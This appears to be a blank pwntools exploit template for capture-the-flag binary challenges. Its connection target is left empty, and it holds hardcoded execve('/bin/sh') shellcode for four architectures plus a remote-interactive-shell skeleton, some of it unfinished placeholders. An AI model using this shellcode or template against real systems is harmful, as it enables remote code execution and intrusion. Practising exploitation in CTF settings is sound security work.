#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = ""
PORT = 10001
ELF_PATH = ""
LIBC_PATH = ""

# setting 
context.arch = 'amd64'
#context.arch = 'i386'
#context.arch = 'arm'
#context.arch = 'aarch64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def sc(arch=context.arch):
    if arch == "i386":
        # shellcraft.i386.linux.sh(), null free, 22 bytes
        return "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0b\x58\x99\xcd\x80"
    elif arch == "amd64":
        # shellcraft.amd64.linux.sh(), null free, 24 bytes
        return "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"
    elif arch == "arm":
        # null free, 27 bytes
        return "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
    elif arch == "aarch64":
        # 4 null bytes, total 35 bytes
        return "\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68"
    else:
        return None

def str_addr(s, f): # search string address in file
    result = list(f.search(s+"\x00"))
    if not len(result): # no result
        return None
    else:
        return result[0]

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    r.recvuntil("")
    r.sendline("")
    r.sendafter(delim, data) # recvuntil(delim) + send(data)
    r.sendlinethen(delim, data) # sendline(data) + recvuntil(delim)

    r.interactive()
